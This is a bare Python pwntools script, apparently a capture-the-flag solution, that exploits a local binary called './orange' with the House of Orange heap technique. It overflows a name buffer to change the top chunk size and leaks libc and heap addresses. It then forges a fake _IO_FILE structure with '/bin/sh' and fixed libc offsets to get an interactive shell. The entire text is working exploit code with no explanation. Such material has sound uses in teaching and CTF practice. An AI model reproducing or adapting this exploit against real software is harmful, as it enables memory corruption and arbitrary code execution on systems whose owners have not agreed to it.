from pwn import *
p=process('./orange')
#attach(p,"b _IO_flush_all_lockp")
def build(le,nam,pri=10,col=6):
    p.sendlineafter('choice','1')
    p.sendlineafter('Length',str(le))
    p.sendlineafter('Name',nam)
    p.sendlineafter('Price',str(pri))
    p.sendlineafter('Color',str(col))
def see():
    p.sendlineafter('choice','2')
def upgrade(le,nam,pri=10,col=6):
    p.sendlineafter('choice','3')
    p.sendlineafter('Length',str(le))
    p.sendlineafter('Name',nam)
    p.sendlineafter('Price',str(pri))
    p.sendlineafter('Color',str(col))
build(8,'11111')
upgrade(800,'A'*0x38+p64(0xfa1))
build(0x1000,'1')
build(0x400,'1'*7)
see()
p.recvuntil('1'*7+'\n')
libc=u64(p.recvuntil('\n')[:-1].ljust(8,'\x00'))-3953032
print(hex(libc))
upgrade(16,'1'*15)
see()
p.recvuntil('1'*15+'\n')
heap=u64(p.recvuntil('\n')[:-1].ljust(8,'\x00'))
print(hex(heap))
upgrade(0x1000,p64(libc+283536)+'A'*0x418+'/bin/sh\x00'+p64(0x61)+p64(1)+p64(libc+3953936)+p64(0)+p64(1)+'A'*0x90+p64(0)+'A'*0x10+p64(heap-0x8))
p.sendlineafter('choice','1')
p.interactive()
